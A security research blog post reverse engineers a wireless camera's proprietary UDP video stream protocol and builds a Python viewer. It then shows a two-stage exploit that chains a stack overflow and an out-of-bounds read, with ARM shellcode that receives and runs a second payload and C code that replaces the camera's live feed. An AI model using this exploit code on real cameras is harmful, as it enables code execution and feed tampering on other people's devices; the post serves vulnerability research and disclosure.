---
published: true
title: "ðŸ“· [6] Reversing and Messing with Video Stream Protocol"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Reverse Engineering
  - Exploitation
  - C
  - Python
  - Image Formats
tagline: "Lets spend some time reversing and messing with the camera stream, we'll also write some code to view the stream so we don't need to use the app."
excerpt: "The camera doesn't seem to use a standard stream protocol, lets reverse it and mess with it."
header:
  teaser: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_image: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_filter: 0.4
  #caption: "Photo credit: [**Unsplash**](https://unsplash.com)"
---

In earlier blogs, we've reversed the DRW message types that are used to remotely control the camera (so, the data going into the camera from the app), but we never looked at the stream data coming out of the camera - lets reverse that.

# Reversing Stream Messages

We start by taking captures of the app, and using Jadx and Frida to reverse engineer both sides of the communication for a clear picture of what is going on.

## Packet Structure

It is probably best to describe the structure of a packet by dissecting an actual captured packet, so here's a packet:

![wireshark_packet_parts.png](/assets/images/analysing_a_wireless_network_camera_part_6/wireshark_packet_parts.png)

### Yi Header 

This header is shown in red:

| Value  | Purpose                                                                          |
| ------ | -------------------------------------------------------------------------------- |
| 0xf1   | Fixed                                                                            |
| 0xd0   | DRW message type                                                                 |
| 0x0404 | Message Length (max message length is 0x404, large messages split into multiple) |

### DRW Header

This header is shown in purple:

| Value | Purpose        |
| ----- | -------------- |
| 0xd1  | Fixed          |
| 0x02  | Channel number |
| 0x0   | Message Index  |

### TNP Header

This header is shown in green:

| Value  | Purpose                                                 |
| ------ | ------------------------------------------------------- |
| 0x1    | version                                                 |
| 0x1    | ioType (unknown = 0, video = 1, audio = 2, command = 3) |
| 0x0    | abilityRet                                              |
| 0x0    | Unused                                                  |
| 0x17c7 | Total length                                            |

### Player Header

This header is shown in turquoise:

| Index | Length | Purpose     |
| ----- | ------ | ----------- |
| 0x0   | 0x2    | codec_id    |
| 0x2   | 0x1    | flags       |
| 0x3   | 0x1    | liveFlag    |
| 0x4   | 0x1    | onlineNum   |
| 0x5   | 0x1    | useCount    |
| 0x6   | 0x2    | frmNo       |
| 0x8   | 0x2    | videoWidth  |
| 0xa   | 0x2    | videoHeight |
| 0xc   | 0x4    | timestamp   |
| 0x10  | 0x1    | isDay       |
| 0x11  | 0x1    | cover_state |
| 0x12  | 0x1    | outloss     |
| 0x13  | 0x1    | inloss      |
| 0x14  | 0x4    | timestamp   |

### Stream Data

After the player header, the remaining data is h264 encoded stream data which completes the message. If the stream data is too large to fit into a single message, the data is split into multiple packets, and recombined by the app. Here is an example of the second part of a larger message.

![wireshark_packet_parts_first_bit.png](/assets/images/analysing_a_wireless_network_camera_part_6/wireshark_packet_parts_first_bit.png)

We can see that there is both Yi and DRW headers to identify the message index and the channel the message is sent on. These messages will repeat until the full message has been received by the app.

### Channels

In the h264 stream format, there is the concept of P-frames and I-frames:
- I-frame (Intra Frame): a.k.a keyframe, this acts as a reference point that an entire image can be constructed from
- P-frame (Predicted Frame): this is a smaller message that indicates what has changed from the last keyframe, so the last keyframe has the changes applied to it to display an updated image without sending another keyframe

The DRW header has a channel parameter, by looking at captures, it was observed to be either 2 or 3. By reverse engineering the app, it turns out they use channel 2 for I-frames, and 3 for P-frames.

## ACK Messages

Despite using UDP, they have checks to ensure that all messages have been received by the app in the form of sending ACKs to the camera. If the camera doesn't receive an ACK for a message, then it will resend the message until it gets one.

Here is an example ACK message:

![wireshark_packet_parts_second_bit.png](/assets/images/analysing_a_wireless_network_camera_part_6/wireshark_packet_parts_second_bit.png)

We can see that this message is acknowledging three message indexes: 0, 1 and 2. It has a standard Yi Header (red), and the DRW header (purple) is similar. The short at the end of the DRW header is no longer the message index, but the number of messages that are being acknowledged. This is then followed by the message index IDs that are being ACK'd (yellow).

With that, we should have the knowledge to receive and parse the camera stream!

# Implementing in Python

## Starting the Stream

To start the stream, we have to send a DRW message with ID 0x2345 called *IOTYPE_USER_TNP_IPCAM_START_KEY*.

Here is the complete startup procedure:

```
[*] Sending LAN_SEARCH packet to port 32108
[*] 00000000  F1 30 00 00                                       .0..
[+] Received PunchPkt response from port 12303:
    00000000  F1 41 00 2C 54 32 30 36 39 30 30 00 00 09 A8 50   .A.,T206900....P
    00000010  33 30 33 31 36 00 00 00 D2 03 04 00 66 0F F0 6E   30316.......f..n
    00000020  A5 16 50 91 A4 07 FB C5 45 B7 1B 19 15 1A 10 E0   ..P.....E.......
[*] Using port 12303 for session
[*] Sending PUNCHPKT_EX packet to port 12303
[*] 00000000  F1 41 00 14 54 32 30 36 39 30 30 00 00 09 A8 50   .A..T206900....P
    00000010  33 30 33 31 36 00 00 00                           30316...
[+] Received P2PRdy response from port 12303:
    00000000  F1 42 00 14 54 32 30 36 39 30 30 00 00 09 A8 50   .B..T206900....P
    00000010  33 30 33 31 36 00 00 00                           30316...
[+] Stream start message sent!
[*] 00000000  F1 D0 00 38 D1 00 00 00 01 03 00 00 00 00 00 2C   ...8...........,
    00000010  23 45 00 00 00 00 00 00 00 00 00 00 00 00 00 00   #E..............
    00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
    00000030  00 00 00 00 00 00 00 00 02 02 01 00               ............
```

## Handling the Packets

Once the stream starts, the camera sends a flurry of packets that are not guaranteed to be in order - we will need a bunch of threads to do all the heavy lifting of sorting the packets and dispatching them. Here is the structure I came up with:

![python_stream_breakdown.png](/assets/images/analysing_a_wireless_network_camera_part_6/python_stream_breakdown.png)

We initialise the *ffplay* (simple media player that uses *ffmpeg*) subprocess like so:

```
-python
def ffplay_run_and_listen():
	width, height = 640, 360

	# Launch ffplay to display the video stream
	process = subprocess.Popen(
		['ffplay', '-probesize', '64', '-i', 'udp://127.0.0.1:13377', '-vf', f'scale={width}:{height}'],
		stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
	)
	
	# Wait for ffplay process to finish
	process.communicate()
```

With all of the underlying structure in place, we get the following output!

![working_stream.png](/assets/images/analysing_a_wireless_network_camera_part_6/working_stream.png)

# Hijacking the Stream

I've got a load of bugs, and I've got the camera stream figured out for easy debugging - lets try and hijack the stream locally.

I decided to use the *USER_IPCAM_SET_AP_MODE_REQ* stack overflow, combined with the OOB read we discovered before, to get a large payload running in memory. 

## Setting the Stage

We need a decent chunk of space on the stack to execute stage 1, we can use the 'offset' we use for the OOB read to give us lots of space on the stack. If we set the offset to be large and put the *USER_IPCAM_SET_AP_MODE_REQ* overflow data after it that will trigger the bug, we get a bunch of space between the end of the headers and the start of the *USER_IPCAM_SET_AP_MODE_REQ* data which is handy. It was easier to put the *USER_IPCAM_SET_AP_MODE_REQ* at the end as the length of this is variable - this just saves me changing the offset from the stack base I jump to.

We can then use the OOB read bug to figure out the stack address, I used gdb to work out the difference between the leaked pointer and the address our stage 1 buffer ends up. Once we know the address, we know what to overflow the return address with when we trigger the *USER_IPCAM_SET_AP_MODE_REQ* overflow. 

It is worth noting I could have also used some values in the heap/global regions that I know the address of as the heap is executable, however, I couldn't find a nice way of getting a large enough consecutive region without relying on a bug. Therefore, I figured sticking with the OOB read and using the stack would be much less hassle and I'd have to rely on a bug to use the heap anyway!

## Stage 1

As this data is received using **recv** and doesn't have any annoying null issues (unlike everything else I seem to find), we don't need to worry about decoding it, we can just chuck shellcode into this buffer and execute it (as **libYIP2P.so** doesn't have NX enabled).

Our shellcode does the following:
1. **malloc** a buffer which has space for stage 2
2. Use **socket** to initialise a TCP socket
3. Create the **sockaddr** in memory that sets port number
4. Now call **bind** to bind the created socket to the port
5. Use **listen** to wait for incoming connections to the listening socket
6. Once past the **listen** call, use **accept** to accept the incoming connection
7. Now use **recv** to get stage 2, and save it to the buffer that was **malloc**'d at the start
8. We are done with the socket now, so **close** the socket
9. Spawn a thread using **ak_thread_create** that will execute stage 2
10. Now the stage 2 thread is running, we can exit the current thread (this thread is spawned for the session and then discarded after, so no harm done)

The assembly isn't that interesting, just loads of function calls and chucking stuff on the stack, but I'll put here anyway if you wanted to see some basic ARM assembly:

```
-python
def generate_stage_1_payload(payload_start, libc_base, target_length, stage_2_length):
	malloc_addr = 0x19498
	socket_addr = 0x19f54
	bind_addr = 0x1906c
	listen_addr = 0x1a2a8
	accept_addr = 0x1a1a0
	recv_addr = 0x195ac
	close_addr = 0x19ad4
	sleep_addr = 0x192a0
	  
	sockaddr_in_addr = 0x4b9748
	thread_id_addr = 0x4b9744
	create_thread_addr = 0x6eb2c
	detach_thread_addr = 0x1a308
	  
	ak_thread_exit_addr = 0x6ecd8
	  
	stage1_asm = f"""
	@ malloc some space and put location on stack
	ldr r0, =#{hex(stage_2_length)}
	ldr r12, =#{hex(malloc_addr)}
	blx r12
	stmdb sp!,{{r0}}
	cpy r5, r0
	  
	@ now call socket to get our socket fd and put fd on stack
	mov r0, #2
	mov r1, #1
	mov r2, #0
	ldr r12, =#{hex(socket_addr)}
	blx r12
	stmdb sp!,{{r0}}
	  
	@ create the sockaddr in memory (can use a bit of the device_param space in anyka_ipc as only 64 bytes used)
	ldr r2, =#0x39050002
	ldr r1, =#{hex(sockaddr_in_addr)}
	str r2, [r1]
	stmdb sp!,{{r1}}
	
	@ now call bind with the socket_fd in r0, and the sockaddr addr in r1 (plus len in r2)
	mov r2, #0x10
	ldr r3, =#{hex(bind_addr)}
	blx r3
	  
	@ now call listen to wait for connections, assume all registers dead
	ldr r0, [sp, #4]
	mov r1, 0x3
	ldr r3, =#{hex(listen_addr)}
	blx r3
	  
	@ at this point we now have a connection, accept the connection, save new socket
	ldr r3, =#{hex(accept_addr)}
	ldr r2, =#0xb8ad4
	ldr r0, [sp, #4]
	ldr r1, [sp]
	blx r3
	stmdb sp!,{{r0}}
	  
	@ now we need to recv the data on the new socket
	ldr r1, [sp, #0xc]
	ldr r2, =#{hex(stage_2_length)}
	mov r3, #0x0
	ldr r4, =#{hex(recv_addr)}
	blx r4
	  
	@ now close the socket for cleanliness
	ldr r0, [sp, #0x0]
	ldr r3, =#{hex(close_addr)}
	blx r3
	  
	@ create a thread that executes the received function (arg 4 on stack)
	ldr r0, =#0xffffffff
	str r0, [sp, #0x0]
	ldr r0, =#{thread_id_addr}
	ldr r1, [sp, #0xc]
	mov r2, #0
	ldr r3, =#0x19000
	ldr r8, =#{create_thread_addr}
	blx r8
	  
	@ exit the thread now
	ldr r3, =#{ak_thread_exit_addr}
	blx r3
	"""
	  
	payload_assembled = asm(stage1_asm, arch='arm', endian="little")
	payload_assembled_bytes = bytes.fromhex(payload_assembled.hex())
	  
	# build payload
	payload = payload_assembled_bytes + (target_length - len(payload_assembled_bytes)) * b'\x41'
	  
	return payload
```

## Stage 2

This is the stage that will actually hijack the stream, all of the stream sending is done in the **yi_live_video_thread**:

![live_video_thread.png](/assets/images/analysing_a_wireless_network_camera_part_6/live_video_thread.png)

And this thread is spawned in the **yi_video_init** function:

![yi_video_init.png](/assets/images/analysing_a_wireless_network_camera_part_6/yi_video_init.png)

With these functions in mind, the payload strategy became as follows:
- Kill off the existing thread by setting **yi_av.ctrl.vi_run_flag** to 0
- Call **yi_video_deinit** to reset everything to a clean state
- Execute our function that will essentially run a slightly modified **yi_video_init** function, but the thread will be created with a function that we control
- The thread function will be a modified **yi_live_video_thread** that sends whatever data we want instead of the result of **ak_venc_get_stream**

I'll omit the majority of the code as its pretty ugly, and most of it is very similar to the functions above (and struct definitions), but here is the thread function that does the heavy lifting:

```
-c
// this is basically what the binary does, except we replace the data and length
while (arg->run_flag != 0){
	// set switchFileTime global
	time_t current_time = get_time((time_t) 0x0);
	uint32_t* g_switchFileTime_addr = (uint32_t*) 0x4b98d8;
	*g_switchFileTime_addr = current_time;
	  
	// get fps for h264 buffer stuff
	uint32_t fps = ak_venc_get_fps(arg->venc_handle);
  
	// fetch the current stream to steal ts and sequence number
	if (ak_venc_get_stream(arg->stream_handle, &stream) == 0){
		my_stream.ts = stream.ts;
		my_stream.seq_no = stream.seq_no;
  
		// add to the h264 stream buffer
		platform_streamer_buffer_h264(1, my_stream.frame_type, stream.ts, fps, 0x20, my_stream.data, my_stream.len);
		ak_venc_release_stream(arg->stream_handle, &stream);
		mssleep(5);
	} else {
		mssleep(10);
	}
}
```

You can see that I am basically just spamming iframes at the camera that I control, the stream bytes were generated by using **ffmpeg** to convert png's to a h264 file, and then extracting the frame from there. So does it work?

![hackerman_demo.jpg](/assets/images/analysing_a_wireless_network_camera_part_6/hackerman_demo.jpg)

It does! The high data speed is because the camera is spamming I-frames, when during normal usage it would only send one every few seconds. This means that if someone came along and connected to your cameras access point (while the camera is in hotspot mode) while you were looking at the stream, they could force the camera to display whatever image they wanted to you.

# Summary

In this blog, we reverse engineered the stream messages that the camera sends out, we processed the messages into a valid h264 stream and displayed it using ffplay. With the stream reverse engineered, we used bugs we found in a previous blog to take control of the camera's live stream and display whatever image we want to someone using the camera.
